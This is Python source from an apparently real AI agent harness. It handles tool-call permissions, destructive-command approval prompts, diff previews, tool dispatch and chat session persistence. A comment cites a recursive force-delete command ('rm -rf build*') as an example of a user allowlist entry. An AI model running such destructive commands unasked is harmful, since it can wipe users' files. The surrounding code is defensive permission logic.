        text = " ".join(str(v or "") for v in (" ".join(map(str, cmd)) if isinstance(cmd, list) else cmd,
                                                args.get("content"), args.get("new"), args.get("input"))) + \
            " ".join(str(c) for c in args.get("commands") or [])
        if _office_direct_on() and self._lean():     # MH_OFFICE_DIRECT=1: small office jobs are done by hand
            writes = name in ("write_file", "edit", "apply_patch") or re.search(
                r"\.write\(|writestr|>\s*\S|sed\s+-i|\.save\(|ZipFile\([^)]*['\"][wa]['\"]", text)
            if getattr(self, "office_revisions", False) and writes and \
                    re.search(r"<w:(?:ins|del)\b|w:ins\b|w:del\b", text):
                # Office-7 on 9cd021c0: docx_tracked written as raw revision XML took 71 calls where
                # edit_office_file's tracked_replace took 8
                return ("Not run: Word tracked changes are not written as XML by hand here. Use edit_office_file "
                        "with tracked_replace (find, replace), tracked_delete or tracked_insert_after: it writes real "
                        "revisions Word can accept or reject, in one call.")
            return ""
        m = self._HANDMADE.search(text)
        if not m:
            return ""
        deck = any(k in m.group(0) for k in ("Presentation", "slide", "pptx", "Pptx"))
        return ("Not run: slides are never written by hand here. Use make_deck for a new deck, or add_slides to add "
                "slides to a deck the user has (it keeps the deck's look). Put what each slide must show, with the "
                "numbers or the files that hold them, in the request." if deck else
                "Not run: workbooks are never built by hand here. Use make_spreadsheet (or office_task) for a new "
                "workbook or model; describe the sheets, inputs and outputs in the request. To read or change a few "
                "values in an existing workbook, openpyxl.load_workbook is fine.")

    def _permit(self, name: str, args: dict) -> tuple[bool, str]:
        if name == "delegate_task":
            return True, ""                    # its sub-agents' own actions are checked against this chat's mode
        if name in ("shell", "exec_command"):
            hit = T.patch_from_shell(args.get("command") if name == "shell" else args.get("cmd"))
            if hit:                            # apply_patch through the shell is an edit like any other
                name, args = "apply_patch", {"input": hit[0]}
        from meshpool_harness.agent import extras as EX
        hk = EX.run_hooks_full(self.root, "PreToolUse", {}, tool=name, args=args)
        if hk["blocked"]:
            return False, f"Blocked by a hook: {hk['message']}"
        rules = _rules(self.root)
        hit = _rule_hit(rules["deny"], name, args, deny=True)
        if hit:                                # read before a hook's allow: a hook never overrides a saved deny
            subst = hit.startswith("bash:") and any(re.search(r"\$\(|`|[<>]\(", c) for c in PR.commands_of(name, args))
            return False, (f"Not allowed by your saved rule {hit!r} (permissions.json). Do something else, or ask the user to change the rule."
                           + (" While a bash deny rule is saved, no command with $(...), backticks or <(...) runs: "
                              "run its parts as separate plain commands." if subst else ""))
        if hk["allow"] and not _destructive(args, self.root):
            return True, ""
        if _rule_hit(rules["allow"], name, args) and not _destructive(args, self.root):
            return True, ""
        risky = self._outside(name, args) if self.mode != "auto" else ""
        if self.mode == "auto" and _destructive(args, self.root):        # OSS-18: Full access still asks about these ...
            if _rule_hit([r for r in rules["allow"] if r.startswith("bash:")], name, args):
                return True, ""          # ... unless the user allowlisted this command ("bash:rm -rf build*"; a bare
            risky = risky or "destructive"                    # "bash" or --allowed-tools bash allows the tool, not this)
        if not risky and (self.mode == "auto" or name in READ_ONLY or name.replace("-", "_") in SAFE_MCP):
            return True, ""
        if self.mode == "edits" and name in ("edit", "write_file", "apply_patch", "notebook_edit"):
            return True, ""                    # auto-accept edits: file changes go through, commands still ask
        if name in ("edit", "write_file") and self._exists(args.get("path", "")) and \
                self._diff(name, args) == "(no change)" and self._same_bytes(name, args):
            return True, ""                    # nothing would change, byte for byte: do not ask
        group = ("edit" if name in ("edit", "write_file", "apply_patch", "notebook_edit")
                 else "bash" if name in ("bash_many", "bash_start", "probe", "trace", "shell", "exec_command") else name)
        if risky:
            group = "outside-" + name
        cmds = PR.commands_of(name, args) if group == "bash" and not risky else []
        if cmds and self.mode in ("ask", "edits") and not _destructive(args, self.root) and \
                all(PR.safe_read(c, self.root) for c in cmds):
            return True, ""                    # H-15: a plain read-only command inside the project needs no question
        if group == "bash":
            pats = [x[5:] for x in self.always if x.startswith("bash:")]
            if cmds and not _destructive(args, self.root) and all(PR.granted(c, pats) for c in cmds):
                return True, ""                # the chat grant covers only the command patterns the user allowed
        elif group in self.always and risky != "destructive" and not _destructive(args, self.root):
            return True, ""                    # a chat grant never covers a destructive command (OSS-18)
        if not self.approve:
            return False, "No one is available to approve this. Run with --auto to allow changes."
        if risky == "destructive":             # the command itself, as the other command cards show it
            shown = PR.commands_of(name, args) or [str(args.get("command") or args.get("cmd") or "")]
            wd = f"cd {args['workdir']} && " if name in ("shell", "exec_command") and args.get("workdir") else ""
            kind, title, detail = "bash", "Run this destructive command?", wd + "\n".join(shown)
        elif risky:
            kind, title, detail = "read", risky, json.dumps(args, indent=1, ensure_ascii=False)[:3000]
        elif name == "bash":
            kind, title, detail = "bash", "Run this command?", args.get("command", "")
        elif name == "bash_start":
            kind, title, detail = "bash", "Start this in the background?", args.get("command", "")
        elif name in ("shell", "exec_command"):
            kind, title, detail = "bash", "Run this command?", _summary_of(name, args)
        elif name == "apply_patch":
            files = _patch_files(args.get("input"))
            kind, title, detail = "edit", "Apply a patch to " + (", ".join(files[:3]) + (" and more" if len(files) > 3
                                                                                        else "") or "files") + "?", \
                self._diff(name, args)
        elif name == "bash_many":
            cmds = [str(c) for c in args.get("commands") or []]
            kind, title, detail = "bash", f"Run these {len(cmds)} commands?", "\n".join(cmds)
        elif name in ("edit", "write_file"):
            kind, title, detail = "edit", f"{'Edit' if name == 'edit' else 'Write'} {args.get('path', '')}?", \
                self._diff(name, args)
        else:
            tool = name.split('__', 2)[-1]
            target = str(args.get("filename") or args.get("path") or args.get("url") or "")[:80]
            nice = {"make_document": "Make a Word document", "make_pdf": "Make a PDF", "make_spreadsheet":
                    "Build a spreadsheet", "make_deck": "Make a PowerPoint deck", "convert_document": "Convert a file",
                    "analyze_data": "Analyse data"}.get(tool) or ("Use " + tool.replace("_", " ") + " ("
                                                              + name.split('__')[1].replace("_", " ") + ")")
            kind, title = ("doc" if args.get("markdown") else "mcp"), f"{nice}{' ' + target if target else ''}?"
            body = args.get("markdown") or args.get("request") or args.get("content")
            detail = (str(body)[:3000] if isinstance(body, str) and body.strip()
                      else json.dumps(args, indent=1, ensure_ascii=False)[:3000])
        pats = [p for c in cmds for p in PR.grant_patterns(c)] if group == "bash" and not _destructive(args, self.root) else []
        pats = list(dict.fromkeys(pats))
        scope = ("once" if risky == "destructive" or _destructive(args, self.root) else   # a destructive command: this once only
                 "all file edits" if group == "edit" else "this tool" if group != "bash" else
                 " and ".join(f"`{p}`" for p in pats[:3]) + " commands" if pats else "once")   # once: no chat grant
        decision, note = PR.approve_with_scope(self.approve, kind, title, detail, scope)
        if decision in ("yes", "always"):      # re-check on edit never runs a command again that needed this yes
            self.ws.__dict__.setdefault("asked_cmds", set()).update(
                c.strip() for c in PR.commands_of(name, args) if c.strip())
        if decision == "always" and scope != "once":
            if group == "bash":
                self.always.update("bash:" + p for p in pats)   # no pattern (a chain, a redirect): this once only
            else:
                self.always.add(group)
        return decision in ("yes", "always"), note or ""

    def _same_bytes(self, name: str, args: dict) -> bool:
        """True when the write would leave the file's bytes exactly as they are. A diff of decoded lines hides line
        endings, the final newline and bytes that are not UTF-8, so it alone cannot skip the prompt."""
        try:
            p = self.ws._path(str(args.get("path", "")), write=True)
            raw = p.read_bytes()
            if name == "write_file" and not args.get("append"):
                return raw == str(args.get("content", "")).encode("utf-8")
            return False
        except Exception:  # noqa: BLE001
            return False

    def _diff(self, name: str, args: dict) -> str:
        """The change an edit or write_file would make, for the tool card and the approval prompt. Never raises:
        the arguments may not have been validated yet."""
        try:
            return self._diff_text(name, args)
        except Exception:  # noqa: BLE001
            return ""

    def _diff_text(self, name: str, args: dict) -> str:
        """The diff the user approves (and the tool card shows). Several changes in one edit call (`edits` for one
        file, `changes` for several) show every file's diff, so an approval never shows less than will change."""
        if name == "apply_patch":                      # the patch is the diff: what the user approves is what is applied
            lines = str(args.get("input") or "").splitlines()
            return "\n".join(lines[:200]) + ("\n..." if len(lines) > 200 else "")
        if name == "edit" and (isinstance(args.get("edits"), list) or isinstance(args.get("changes"), list)):
            groups: dict = {}
            if isinstance(args.get("changes"), list):
                for c in args["changes"]:
                    if isinstance(c, dict):
                        items = c.get("edits") if isinstance(c.get("edits"), list) else [c]
                        groups.setdefault(str(c.get("path", "")), []).extend(items)
            if isinstance(args.get("edits"), list):
                first = [{"old": args["old"], "new": args.get("new", "")}] if args.get("old") is not None else []
                groups.setdefault(str(args.get("path", "")), []).extend(first + list(args["edits"]))
            parts = []
            for path, items in groups.items():
                try:
                    p = self.ws._path(path, write=True)
                    before = p.read_text(encoding="utf-8", errors="replace") if p.exists() else ""
                except Exception:
                    before = ""
                after = before
                for it in items:
                    old, new = str((it or {}).get("old", "")), str((it or {}).get("new", ""))
                    after = after.replace(old, new, 1) if old and after.count(old) == 1 else after + \
                        f"\n[an edit that matches only after whitespace changes]\n-{old}\n+{new}"
                parts += list(difflib.unified_diff(before.splitlines(), after.splitlines(), f"a/{path}", f"b/{path}",
                                                   n=2, lineterm=""))
            return "\n".join(parts[:300]) + ("\n..." if len(parts) > 300 else "") if parts else "(no change)"
        path = str(args.get("path", ""))
        try:
            p = self.ws._path(path, write=True)
            before = p.read_text(encoding="utf-8", errors="replace") if p.exists() else ""
        except Exception:
            before = ""
        if name == "edit":
            if before.count(args.get("old", "")) == 1:
                after = before.replace(args["old"], args.get("new", ""), 1)
            else:
                before, after = args.get("old", ""), args.get("new", "")
        else:
            after = (before + args.get("content", "")) if args.get("append") else args.get("content", "")
        d = list(difflib.unified_diff(before.splitlines(), after.splitlines(), f"a/{path}", f"b/{path}",
                                      n=2, lineterm=""))
        if not before and name == "write_file":
            lines = after.splitlines()
            return f"New file, {len(lines)} line{'' if len(lines) == 1 else 's'}\n" + "\n".join("+" + x for x in lines[:60]) + \
                ("\n..." if len(lines) > 60 else "")
        return "\n".join(d[:200]) + ("\n..." if len(d) > 200 else "") if d else "(no change)"

    def _run_tool(self, c: dict, cut: bool = False) -> str:
        t0 = time.time()
        f = c.get("function") or {}
        name, raw = f.get("name", ""), f.get("arguments") or "{}"
        cid = c.get("id", "")
        try:
            args = json.loads(raw) if isinstance(raw, str) else dict(raw)
            if not isinstance(args, dict):
                args = {}
        except ValueError:
            args = {}
        is_mcp = bool(self.mcp and self.mcp.has(name))
        if E2E and name not in ("bash", "bash_many", "bash_start", "bash_output", "bash_stop", "todo_write", "update_plan",
                                "edit", "write_file", "apply_patch", "shell", "exec_command", "probe", "trace"):
            rep = self.__dict__.setdefault("_hard_rep", {})
            tno = getattr(self, "_turn_no", 0)         # a run_tool outside send() has no turn counter yet
            if rep.get("turn") != tno:
                rep.clear()
                rep["turn"] = tno
            k = name + ":" + str(raw)[:500]
            rep[k] = rep.get(k, 0) + 1
            if rep[k] > 10:                         # 0.0.13: a loop one call at a time (379 memory_view calls once)
                return ("[Meshpool] This exact call was already made more than 10 times this turn and was not run. "
                        "Stop calling it. Write the deliverable now from what you have, with your assumptions listed.")
        bad = None                                 # validate first: the card shows the arguments that will run
        if cut:
            bad = ToolError(f"this {name} call was cut off at the model's output limit, so its arguments are "
                            "incomplete and it was not run. Split the content into smaller pieces: write_file the "
                            "first part, then write_file with append=true for each further part, or make several "
                            "smaller edits.")
        elif name == MA.FIND and not self.plan:
            pass                                       # connected-tool lookup (mcp_assist): no schema to validate
        elif not is_mcp:
            try:
                args = validate(name, raw, self._tool_names() + (
                    ["delegate_task"] if name == "delegate_task" and getattr(self, "_delegate_depth", 0) == 0
                    and not self.plan and _subagents_on() else []))
            except ToolError as e:
                bad = e
        elif self.plan and name.replace("-", "_") not in PLAN_MCP:
            bad = ToolError(f"{name} is not available in plan mode: it can change things. Investigate with "
                            "read-only tools and write the plan; the user switches to building to run it.")
        self._open_calls[cid] = name
        self.emit({"type": "tool_start", "id": cid, "name": name, "summary": _summary(name, args), "mcp": is_mcp,
                   "timeout_s": (args.get("timeout_s") if name in ("bash", "bash_many") else
                                 args["timeout_ms"] / 1000 if name == "shell" and isinstance(
                                     args.get("timeout_ms"), (int, float)) else
                                 args["yield_time_ms"] / 1000 if name == "exec_command" and isinstance(
                                     args.get("yield_time_ms"), (int, float)) else None)
                   if isinstance(args, dict) else None,
                   "diff": self._diff(name, args) if name in ("edit", "write_file", "apply_patch") and not bad else ""})
        ok, denied = True, False
        cp = getattr(self, "checkpoint", None)          # the chat's checkpoints (journal mode); sub-agents have none
        cp_ctx = cp.tool(name, args, read_only=name in READ_ONLY or self._inspection(
            name, raw if isinstance(raw, str) else json.dumps(raw))) if cp else None
        cp_on = False                                    # opened only once the call may run: never across an approval wait
        try:
            if bad:
                raise bad
            steer = self._engine_only(name, args)
            allowed, note = (False, "") if steer else self._permit(name, args)
            if cp_ctx and allowed and not steer:
                cp_ctx.__enter__()
                cp_on = True
            if steer:
                out, ok = steer, False
            elif not allowed and self._stop:
                raise Interrupted()                    # Stop is not a refusal: _repair writes "Not run"
            elif not allowed:
                denied, ok = True, False
                out = "The user denied this action." + (f" Their note: {note}" if note else "") + \
                    " Do not retry it. Take another approach or ask the user."
            elif name == "delegate_task":
                from meshpool_harness.agent import delegate as DL
                out, ok = DL.run_tool(self, args)      # not _wait: on Stop it returns the finished reports
            elif is_mcp and name.endswith("run_subtasks"):
                out, err = self._run_subtasks(name, args)
                ok = not err
                out = self.ws._cap(str(out), "mcp")
            elif name == MA.FIND:
                lz = getattr(self, "_lazy", None) or MA.LazyTools(self.profile)
                self._lazy = lz
                out = lz.search(getattr(self, "_lazy_all", []), str(args.get("query") or ""), args.get("names"))
            elif is_mcp and name in getattr(self, "_lazy_hidden", ()) and name not in self._lazy.active:
                out = self._lazy.stub(name, getattr(self, "_lazy_all", [])) or "tool not loaded"
            elif is_mcp:
                out, err = self._wait(self.mcp.call, name, args, on_stop=getattr(self.mcp, "abort_calls", None))
                paged = self.__dict__.setdefault("_paged", set())
                pre, post, ok = MA.classify(str(out), bool(err), name in paged)
                post += self._repeat_note(name, args, ok)
                if ok and MA.assist_on():
                    note, replace = MA.same_result(self.__dict__.setdefault("_same_out", {}), name, str(out))
                    if replace:
                        out = note.strip()
                    else:
                        post += note
                (paged.add if (ok and MA.page_hint(str(out))) else paged.discard)(name)
                out = pre + self.ws._cap(str(out), "mcp") + post    # head and tail; the full output goes to a file
            elif name == "fetch_url":
                out = self._wait(self._fetch, args["url"], args.get("start", 0), args.get("max_chars", 15000),
                                 bool(args.get("links")))
            elif name == "web_research":
                from meshpool_harness import web as WEB
                try:
                    out = self._wait(WEB.research, args.get("question", ""), args.get("queries"), args.get("max_sources", 6),
                                       args.get("recency", ""), args.get("site", ""))
                except WEB.WebError as e:
                    raise ToolError(str(e))
            elif name == "office_task":
                out, ok = self._office(args)
            elif name == "web_search":
                out = self._wait(self._search, args["query"], args.get("max_results", 8), args.get("recency", ""),
                                 args.get("site", ""))
            elif name == "ask_user":
                out = self._ask_user(args)
            elif name == "use_skill":
                from meshpool_harness import skills as SK
                out = SK.instructions(str(args.get("name", "")).lstrip("$"))
                if E2E and not str(out).startswith("ERROR"):    # a skill's "ask the user" is not a reason to stop
                    out += ("\n\n[Meshpool] Where this skill says to ask the user: ask (ask_user) only if you cannot "
                            "go on without the answer. Otherwise assume a sensible default, do the work, and list the "
                            "assumption in your reply. Size the work to the request: one deliverable unless more were "
                            "asked for, no extra plan or tracker files, research only as deep as the request needs.")
            elif name == "find_skill":
                from meshpool_harness import skills as SK
                out = SK.search_text(str(args.get("query", "")))
            elif name == "diagnostics":
                out = self._wait(_PACKS.diagnostics, self.ws, args.get("paths"), args.get("language"),
                                 bool(args.get("deep")))
            elif name == "update_plan":                # Codex's plan tool; the plan event is the same one todo_write sends
                steps = args.get("plan")
                if not isinstance(steps, list):
                    raise ToolError("update_plan: `plan` must be a list of {step, status}")
                items = []
                for i in steps:
                    if not isinstance(i, dict) or not isinstance(i.get("step"), str):
                        raise ToolError("update_plan: every plan item needs a `step` (text) and a `status`")
                    if i.get("status") not in ("pending", "in_progress", "completed"):
                        raise ToolError(f"update_plan: status '{i.get('status')}' is not one of pending, in_progress, "
                                        "completed")
                    items.append({"content": i["step"], "status": i["status"]})
                self._todos, self._todo_touched = items, True
                self.emit(dict(_PLAN.state(items) or {"items": [], "current": 0, "total": 0, "done": 0},
                               type="plan", entries=items))
                out = "Plan updated"
            elif name == "todo_write":
                items = [{"content": str(i.get("content", "")), "status": i.get("status", "pending")}
                         for i in args.get("items") or [] if isinstance(i, dict)]
                self._todos, self._todo_touched = items, True
                self.emit(dict(_PLAN.state(items) or {"items": [], "current": 0, "total": 0, "done": 0},
                               type="plan", entries=items))     # entries: what older front ends read
                done = sum(i["status"] == "completed" for i in items)
                out = f"Plan updated: {done} of {len(items)} done."
            elif name == "exec_command":               # Codex 0.171 (profile c171): its result format, as Codex sends it
                before = self._tree_sig()
                out = self.ws.exec_command(**args)
                ok = T.exec_exit_code(out) == 0
                if before is not None and self._tree_sig() != before:
                    self.ws.edits += 1                 # a heredoc write is an edit: the loop guards see the progress
            else:
                out = getattr(self.ws, name)(**args)
                route = getattr(self, "route", None)
                if name in ("edit", "write_file") and route is not None and route.family == "code":
                    out += _PACKS.quick_check(self.ws, args.get("path", ""))   # a broken edit shows now, at no call
                if name in ("bash", "shell"):
                    m = re.match(r"\[exit (\d+)\]", out)
                    ok = (not m and name == "shell") or (bool(m) and m.group(1) == "0")   # shell: a patch has no exit line
                elif name == "bash_many":
                    ok = "[exit " in out and not re.search(r"\[exit [1-9]", out)
                elif name in ("probe", "trace"):
                    ok = out.startswith("[exit 0]")
        except ToolError as e:
            out, ok = f"ERROR: {e}", False
        except (Interrupted, KeyboardInterrupt, usage.BudgetExceeded):
            raise
        except Exception as e:
            out, ok = f"ERROR: {type(e).__name__}: {e}", False
        finally:
            if cp_on:
                cp_ctx.__exit__(None, None, None)
                if name == "bash_start" and ok and not denied:
                    cp.window_open()                    # the background process may still change files
        out = clean(str(out))
        out += self._lookup_note(name, args)
        m = re.match(r"\[exit (\d+)\]", out)
        step = {"tool": name, "s": round(time.time() - t0, 2), "ok": ok and not (m and m.group(1) != "0"),
                "arg": _summary(name, args)[:100] if isinstance(args, dict) else ""}
        if not step["ok"]:
            step["err"] = out[:160]
        with self._trace_lock:                         # one line per tool call: the benchmark's trace
            self.trace.append(step)
        self._open_calls.pop(cid, None)
        self.emit({"type": "tool_end", "id": cid, "name": name, "ok": ok, "denied": denied,
                   "output": out[:6000] + ("\n..." if len(out) > 6000 else "")})
        return out

    # ---------- questions (ask_user) -----------------------------------------------------------------------------
    def pending_question(self) -> dict | None:
        p = getattr(self, "_question", None)
        return {"id": p["id"], "questions": p["questions"]} if p else None

    def reply(self, question_id: str, answers) -> None:
        """A front end answers the waiting ask_user question: answers is a list with one {"selected": [labels],
        "other": text} per question, or plain text the user typed instead of picking."""
        p = getattr(self, "_question", None)
        if not p or (question_id and p["id"] != question_id):
            raise ValueError("That question is no longer waiting.")
        p["answers"] = answers if answers is not None else []
        p["ev"].set()

    def _ask_user(self, args: dict) -> str:
        return self._ask(ASK.normalize(args))[2]

    def _ask(self, qs: list) -> tuple[list, str, str, str]:
        """Ask the user and wait; returns (answers, source, tool result, the text the user typed instead of picking
        options or ""). Who answers: a front end's own
        `ask(qid, questions)` callback (the terminal), a page that calls reply() while this waits (`interactive`
        true: the web app), or no one (headless runs, ACP, tests, auto mode with MH_ASK_AUTO=1): then the
        recommended options, and the result says so."""
        qid = "q-" + uuid.uuid4().hex[:10]
        wait = ASK.timeout_s()
        own = getattr(self, "ask", None)
        live = getattr(self, "interactive", False)
        live = bool(live() if callable(live) else live)
        source = ""
        if self.mode == "auto" and os.environ.get("MH_ASK_AUTO") == "1":
            source = "auto"
        elif not own and not live:
            source = "headless"
        self.emit({"type": "question", "id": qid, "questions": qs, "timeout_s": 0 if source else int(wait)})
        raw = None
        if not source and own:
            raw = own(qid, qs)
            source = "user" if raw is not None else "headless"
        elif not source:
            p = {"id": qid, "questions": qs, "ev": threading.Event(), "answers": None}
            self._question = p
            end = time.time() + wait
            try:
                while not p["ev"].wait(0.5):
                    if self._stop:
                        break
                    if time.time() > end:
                        break
            finally:
                self._question = None
            if p["ev"].is_set():
                raw, source = p["answers"], "user"
            elif self._stop:
                self.emit({"type": "question_done", "id": qid, "source": "stopped", "answers": [],
                           "text": "Stopped before you answered."})
                raise Interrupted()
            else:
                source = "timeout"
        answers, shown, result = ASK.finish(qs, raw, source, wait)
        self.emit({"type": "question_done", "id": qid, "source": source, "answers": answers, "text": shown})
        typed = raw.strip()[:4000] if source == "user" and isinstance(raw, str) else ""
        return answers, source, result, typed

    def _deck_brief(self, args: dict) -> str:
        """office_task with engine slides: settle the deck brief (engines/forge/brief.py) before building. The
        open questions go to the user in one question card; with no one to ask, the recommended answers."""
        req = args["request"]
        try:
            from engines.forge import brief as BR
        except Exception:  # noqa: BLE001  engines not shipped: build from the request as it is
            return req
        fields = {k: args[k] for k in BR.FIELDS if args.get(k) not in (None, "")}
        qs = BR.questions(req, args.get("files"), fields)
        if not qs or args.get("brief_ok") or BR.wants_defaults(req):
            return BR.complete(req, args.get("files"), fields)
        answers, source, _, typed = self._ask(ASK.normalize({"questions": qs}))
        if typed:                                    # the user wrote their own answer: it goes into the request,
            req = f"{req}\n\nThe user's answer to the brief questions: {typed}"   # and only what it leaves open
            return BR.complete(req, args.get("files"), fields)                     # gets a recommendation
        fields.update(BR.answers_from(qs, answers))
        return BR.complete(req, args.get("files"), fields)

    def _office(self, args: dict) -> tuple[str, bool]:
        """Run a one-shot engine (slides, sheets, data) in its own process; files land in the working folder. The
        same runner and report as the Office MCP server (agent/office_jobs.py)."""
        from meshpool_harness.agent import office_jobs as OJ
        engine = args["engine"]
        paths, missing = OJ.resolve_files(self.root, args.get("files"))
        if missing:
            return f"ERROR: input file not found: {missing}", False
        why = OJ.check_request(engine, args.get("request", ""))
        if why:                                  # before the deck brief and the job folder: nothing is built
            return f"ERROR: office_task refused, nothing was built: {why}", False
        if engine == "slides":
            args = dict(args, request=self._deck_brief(args))
        task = self._ensure_task()                # the engine's calls go to a child task: this chat's usage and limit
        child = usage.start_task(chat=self.id, parent=task, label="office:" + engine)
        jid, reused = OJ.start(engine, args["request"], paths, self.root, scope=self.id,
                               model=self.model or None,   # the user's pick; else the engine resolves MH_MODEL / settings
                               env_extra=usage.child_env(child, "engine:" + engine))   # one request, one engine run
        if reused == "refused":
            return OJ.refusal_text(jid, rel_to=self.root), True
        if reused != "done":
            self.emit({"type": "status", "text": f"The {engine} engine is working. Decks and models take a few minutes."})
        seen = {"at": 0.0, "over": None}
        turn = getattr(self, "_turn_usage", None)

        def should_stop() -> bool:                # polled every 0.5 s: follow the engine's usage and the limit
            if time.time() - seen["at"] >= 2:
                seen["at"] = time.time()
                if isinstance(turn, dict):
                    self._absorb_usage(turn)
                seen["over"] = next((t for t in task.chain() if t.budget > 0 and t.spent() >= t.budget), None)
            return bool(self._stop or seen["over"])
        if reused == "running":              # the same request is already building (a parallel call): wait for it
            while not OJ.JOBS[jid]["event"].wait(0.5):
                if self._stop:
                    raise Interrupted()
        elif not reused:
            OJ.run(jid, timeout=float(os.environ.get("MH_OFFICE_TIMEOUT_S", "1500")), should_stop=should_stop)
        if isinstance(turn, dict):
            self._absorb_usage(turn)
        if seen["over"] is not None and not self._stop:
            raise usage.BudgetExceeded(seen["over"].id, seen["over"].budget, seen["over"].spent())
        if OJ.JOBS[jid].get("stopped"):
            raise Interrupted()
        text, failed = OJ.report(jid, rel_to=self.root, reused=reused)
        return text, not failed

    def _search(self, query: str, n: int = 8, recency: str = "", site: str = "") -> str:
        from meshpool_harness import web as WEB
        try:
            return WEB.format_results(WEB.search(query, n, recency, "", site))
        except WEB.WebError as e:
            raise ToolError(str(e))

    def _fetch(self, url: str, start: int = 0, max_chars: int = 15000, links: bool = False) -> str:
        from meshpool_harness import web as WEB
        try:
            return WEB.format_page(WEB.fetch(url), start, max(2000, min(int(max_chars or 15000), 60000)), links)
        except WEB.WebError as e:
            raise ToolError(str(e))

    def _repair(self, note: str = "Not run: the user stopped the agent."):
        """After an interruption every tool call must still have a result, or the next request is invalid."""
        for i in range(len(self.messages) - 1, -1, -1):
            m = self.messages[i]
            if m.get("role") == "assistant" and m.get("tool_calls"):
                have = {x.get("tool_call_id") for x in self.messages[i + 1:] if x.get("role") == "tool"}
                for c in m["tool_calls"]:
                    if c["id"] not in have:
                        partial = (self.__dict__.pop("_delegate_partial", None)
                                   if (c.get("function") or {}).get("name") == "delegate_task" else None)
                        self.messages.append({"role": "tool", "tool_call_id": c["id"],
                                              "content": partial or note})
                break
            if m.get("role") == "user":
                break

    # ---------- sessions ---------------------------------------------------------------------------------------
    def save(self, full: bool = False):
        """Persist the chat. A full snapshot when the saved prefix changed (or ``full``); otherwise only the new
        messages are appended to the journal, so a save during a long turn writes a few kB, not the whole chat."""
        if getattr(self, "deleted", False):           # the user deleted this thread; never bring it back
            return
        lock = self.__dict__.setdefault("_save_lock", threading.Lock())
        try:
            with lock:
                if getattr(self, "deleted", False):
                    return
                msgs = self.messages[1:]
                n = len(msgs)
                meta = {"updated": time.time(), "model": self.current_model(), "model_choice": self.model,
                        "plan": self.plan, "title": self.title, "usage": self.usage,
                        "unfinished": bool(getattr(self, "unfinished", False) or getattr(self, "_running", False)),
                        "route": self.route.to_dict() if getattr(self, "route", None) is not None else None,
                        "route_text": getattr(self, "_route_text", "")}
                pn, pfp = getattr(self, "_persist_n", None), getattr(self, "_persist_fp", None)
                if getattr(self, "_persist_dir", None) != str(self.dir):     # /clear gave the chat a new id: start over
                    pn = None
                fp = lambda m: json.dumps(m, ensure_ascii=False, default=str)  # noqa: E731
                need_full = (full or pn is None or not (self.dir / "session.json").exists() or n < pn
                             or (pn > 0 and fp(msgs[pn - 1]) != pfp)
                             or SS.journal_size(self.dir) > SS.JOURNAL_MAX_BYTES)
                if need_full:
                    SS.write_snapshot(self.dir, {
                        "id": self.id, "workdir": str(self.root), "title": self.title, "created": self.created,
                        "updated": meta["updated"], "model": meta["model"], "model_choice": self.model,
                        "plan": self.plan, "harness": "meshpool-work" if self.profile == "work" else "meshpool-code",
                        "kind": "cowork" if self.profile == "work" else "code", "usage": self.usage,
                        "unfinished": meta["unfinished"], "route": meta["route"], "route_text": meta["route_text"],
                        "messages": msgs})
                else:
                    SS.append_journal(self.dir, pn, msgs[pn:], meta)
                self._persist_n, self._persist_dir = n, str(self.dir)
                self._persist_fp = fp(msgs[-1]) if n else ""
        except OSError as e:
            # the previous files are intact (atomic writes); the next save tries again, and the user is told once
            first = not getattr(self, "save_error", None)
            self.save_error = e.strerror or str(e) or "write failed"
            if first:
                self.emit({"type": "status", "save_error": True, "text": (
                    f"Couldn't save this chat ({self.save_error}). Free some disk space; Meshpool keeps trying.")})
        else:
            if getattr(self, "save_error", None):
                self.save_error = None
                self.emit({"type": "status", "text": "Saved again."})

    @classmethod
    def resume(cls, workdir: str, session_id: str | None = None, **kw) -> "Agent | None":
        root = str(Path(workdir).expanduser().resolve())
        best, best_dir = None, None
        if SESSIONS.exists():
            for p in SESSIONS.glob("*/session.json"):
                if p.parent.name.startswith("sub-"):     # a sub-agent's, never the user's chat
                    continue
                d = SS.read_head(p.parent) or SS.read(p.parent)      # the small head first: not every chat is read in full
                if not d:
                    continue
                if session_id and d.get("id") != session_id:
                    continue
                if not session_id and d.get("workdir") != root:
                    continue
                if d.get("harness") not in (None, "meshpool-code", "meshpool-work"):
                    continue
                if best is None or d.get("updated", 0) > best.get("updated", 0):
                    best, best_dir = d, p.parent
        if not best:
            return None
        if "messages" not in best:                       # only the chat that won is read in full
            best = SS.read(best_dir) or best
        kw.setdefault("profile", "work" if best.get("harness") == "meshpool-work" else "code")
        a = cls(best["workdir"], session_id=best["id"], **kw)
        if isinstance(best.get("route"), dict):
            try:
                from meshpool_harness.hrouter.route import Route
                a.route = Route(**best["route"])
                a._route_text = best.get("route_text") or ""
                a.ws.error_context = a.route.family == "code" and os.environ.get("MH_ERROR_CONTEXT", "") != "0"
                a.messages = [{"role": "system", "content": a.system_prompt()}]
            except TypeError:
                a.route = None
        saved = SS.resolve_refs(best_dir, best.get("messages", []))      # images back from their blob files
        a.messages = [a.messages[0]] + repair_tool_pairs(saved, "Not run: the app closed before this call finished.")[0]
        a.usage = best.get("usage") or a.usage
        a.title = best.get("title", "")
        a.created = best.get("created", a.created)
        a.model = best.get("model_choice")
        a.plan = bool(best.get("plan"))
        a.unfinished = bool(best.get("unfinished"))
        a._repair("Not run: the app closed before this call finished.")
        return a
